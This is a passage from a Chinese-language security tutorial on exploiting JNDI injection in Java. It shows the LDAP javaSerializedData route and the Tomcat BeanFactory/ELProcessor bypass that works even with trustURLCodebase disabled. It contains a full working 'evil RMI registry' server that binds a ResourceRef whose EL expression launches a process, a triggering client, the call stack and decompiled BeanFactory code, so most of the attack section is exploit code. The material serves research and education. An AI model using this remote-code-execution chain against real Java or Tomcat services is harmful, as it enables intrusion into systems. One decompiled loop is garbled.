                    throw var16;
                } finally {
                    if (var20 != null) {
                        if (var21 != null) {
                            try {
                                ((ObjectInputStream)var20).close();
                            } catch (Throwable var15) {
                                var21.addSuppressed(var15);
                            }
                        } else {
                            ((ObjectInputStream)var20).close();
                        }
                    }
                }
                return var5;
            } catch (ClassNotFoundException var18) {
                NamingException var4 = new NamingException();
                var4.setRootCause(var18);
                throw var4;
            }
        } catch (IOException var19) {
            NamingException var3 = new NamingException();
            var3.setRootCause(var19);
            throw var3;
        }
    }
服务端代码可以参考`marshalsec`，然后添加对应属性`javaSerializedData`为我们的Gadgets序列化的数据即可
    e.addAttribute("javaSerializedData", GadgetsData);
### 通过加载本地类
我们上面说过在`JDK
11.0.1、8u191、7u201、6u211之后`之后`com.sun.jndi.ldap.object.trustURLCodebase`
属性的默认值为`false`，我们就不能再从远程的`Codebase`加载恶意的`Factory`类了，但是如果我们利用的类是存在于`CLASSPATH`中的话，那么我们依旧可以利用，我们上面讲过`javax.naming.spi.NamingManager#getObjectFactoryFromReference`是先从本地的`CLASSPATH`寻找是否存在该类，如果没有则再从指定`Codebase`远程加载。
需要注意的，该工厂类型必须实现`javax.naming.spi.ObjectFactory`
接口，因为在`javax.naming.spi.NamingManager#getObjectFactoryFromReference`最后的`return`语句对工厂类的实例对象进行了类型转换`return
(clas != null) ? (ObjectFactory) clas.newInstance() : null;`；并且该工厂类至少存在一个
`getObjectInstance()`
方法。[这篇文章](\[https://www.veracode.com/blog/research/exploiting-jndi-injections-java\]\(https://www.veracode.com/blog/research/exploiting-jndi-injections-java))的作者找到可利用的类为：`org.apache.naming.factory.BeanFactory`，并且该类存在于Tomcat依赖包中，所以利用范围还是比较广泛的。
添加如下依赖：
        org.apache.tomcat
        tomcat-catalina
        8.5.0
        org.apache.el
        com.springsource.org.apache.el
        7.0.26
服务端代码参考自[这篇文章](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)
    package demo;
    import com.sun.jndi.rmi.registry.ReferenceWrapper;
    import org.apache.naming.ResourceRef;
    import javax.naming.StringRefAddr;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    public class RMIServer {
        public static void main(String[] args) throws Exception{
            System.out.println("Creating evil RMI registry on port 1097");
            Registry registry = LocateRegistry.createRegistry(1097);
            ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
            ref.add(new StringRefAddr("forceString", "x=eval"));
            ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
            ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
            registry.bind("Object", referenceWrapper);
        }
    }
客户端
    package demo;
    import javax.naming.InitialContext;
    public class JNDI_Test {
        public static void main(String[] args) throws Exception{
            Object object=new InitialContext().lookup("rmi://127.0.0.1:1097/Object");
        }
    }
调用栈：
    getObjectInstance:123, BeanFactory (org.apache.naming.factory)
    getObjectInstance:321, NamingManager (javax.naming.spi)
    decodeObject:499, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:138, RegistryContext (com.sun.jndi.rmi.registry)
    lookup:205, GenericURLContext (com.sun.jndi.toolkit.url)
    lookup:417, InitialContext (javax.naming)
    main:9, JNDI_Test (demo)
其它的调用和上面讲的一样，我们需要注意的是`javax.naming.spi.NamingManager#getObjectInstance`此处的调用，可以看到该方法中通过`getObjectFactoryFromReference`获取一个实例化的对象之后，还会调用`factory.getObjectInstance`，也就是说如果我们能从其它类中找到其它可以利用的`getObjectInstance`方法，那么我们就可以进行进一步的利用。
    factory = getObjectFactoryFromReference(ref, f);
    if (factory != null) {
        return factory.getObjectInstance(ref, name, nameCtx,
                                         environment);
    }
然后到了我们上面所说的可利用的类：`org.apache.naming.factory.BeanFactory`，该类存在`getObjectInstance`方法，如下
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws NamingException {
        if (obj instanceof ResourceRef) {
            NamingException ne;
            try {
                Reference ref = (Reference)obj;
                String beanClassName = ref.getClassName();
                Class beanClass = null;
                ClassLoader tcl = Thread.currentThread().getContextClassLoader();
                if (tcl != null) {
                    try {
                        beanClass = tcl.loadClass(beanClassName);
                    } catch (ClassNotFoundException var26) {
                    }
                } else {
                    try {
                        beanClass = Class.forName(beanClassName);
                    } catch (ClassNotFoundException var25) {
                        var25.printStackTrace();
                    }
                }
                if (beanClass == null) {
                    throw new NamingException("Class not found: " + beanClassName);
                } else {
                    BeanInfo bi = Introspector.getBeanInfo(beanClass);
                    PropertyDescriptor[] pda = bi.getPropertyDescriptors();
                    Object bean = beanClass.newInstance();
                    RefAddr ra = ref.get("forceString");
                    Map forced = new HashMap();
                    String value;
                    String propName;
                    int i;
                    if (ra != null) {
                        value = (String)ra.getContent();
                        Class[] paramTypes = new Class[]{String.class};
                        String[] arr$ = value.split(",");
                        i = arr$.length;
                        for(int i$ = 0; i$ = 0) {
                                propName = param.substring(index + 1).trim();
                                param = param.substring(0, index).trim();
                            } else {
                                propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
                            }
                            try {
                                forced.put(param, beanClass.getMethod(propName, paramTypes));
                            } catch (SecurityException | NoSuchMethodException var24) {
                                throw new NamingException("Forced String setter " + propName + " not found for property " + param);
                            }
                        }
                    }
                    Enumeration e = ref.getAll();
                    while(true) {
                        while(true) {
                            do {
                                do {
                                    do {
                                        do {
                                            do {
                                                if (!e.hasMoreElements()) {
                                                    return bean;
                                                }
                                                ra = (RefAddr)e.nextElement();
                                                propName = ra.getType();
                                            } while(propName.equals("factory"));
                                        } while(propName.equals("scope"));
                                    } while(propName.equals("auth"));
                                } while(propName.equals("forceString"));
                            } while(propName.equals("singleton"));
                            value = (String)ra.getContent();
                            Object[] valueArray = new Object[1];
                            Method method = (Method)forced.get(propName);
                            if (method != null) {
                                valueArray[0] = value;
                                try {
                                    method.invoke(bean, valueArray);
                                } catch (IllegalArgumentException | InvocationTargetException | IllegalAccessException var23) {
                                    throw new NamingException("Forced String setter " + method.getName() + " threw exception for property " + propName);
                                }
                            } else {
                                //省略部分代码
                            }
                        }
                    }
                }
            }
            //省略部分代码
        } else {
            return null;
        }
    }
可以看到该方法中有反射的调用`method.invoke(bean,
valueArray);`并且反射所有参数均来自`Reference`，反射的类来自`Object bean =
beanClass.newInstance();`，这里是`ELProcessor`
然后就是调用的参数，以`=`号分割，`=`右边为调用的方法，这里为`javax.el.ELProcessor.eval`；`=`左边则是会通过作为`hashmap`的`key`，后续会通过key去获取`javax.el.ELProcessor.eval`。
    int index = param.indexOf(61);
    if (index >= 0) {
        propName = param.substring(index + 1).trim();
        param = param.substring(0, index).trim();
    } else {
        propName = "set" + param.substring(0, 1).toUpperCase(Locale.ENGLISH) + param.substring(1);
    }
    try {
        forced.put(param, beanClass.getMethod(propName, paramTypes));
    } catch (SecurityException | NoSuchMethodException var24) {
        throw new NamingException("Forced String setter " + propName + " not found for property " + param);
    }
其中eval的参数获取如下，可以看到它是通过嵌套多次`do
while`去枚举e中的元素，最后`while(propName.equals("singleton"))`此处`propName`为`x`，则退出循环，然后通过`value
=
(String)ra.getContent();`获取`eval`的参数，之后就是将ra的`addrType（propName）`的值作为key去获取之前存入的`javax.el.ELProcessor.eval`：`Method
method = (Method)forced.get(propName);`
    Enumeration e = ref.getAll();
    do {
        do {
            do {
                do {
                    do {
                        if (!e.hasMoreElements()) {
                            return bean;
                        }
                        ra = (RefAddr)e.nextElement();
                        propName = ra.getType();
                    } while(propName.equals("factory"));
                } while(propName.equals("scope"));
            } while(propName.equals("auth"));
        } while(propName.equals("forceString"));
    } while(propName.equals("singleton"));
    value = (String)ra.getContent();
    Object[] valueArray = new Object[1];
    Method method = (Method)forced.get(propName);
    if (method != null) {
        valueArray[0] = value;
    }
参数如下：
最终通过el注入实现RCE，反射执行的语句可以整理为如下：`(new
ELProcessor()).eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new
java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")");`
# Reference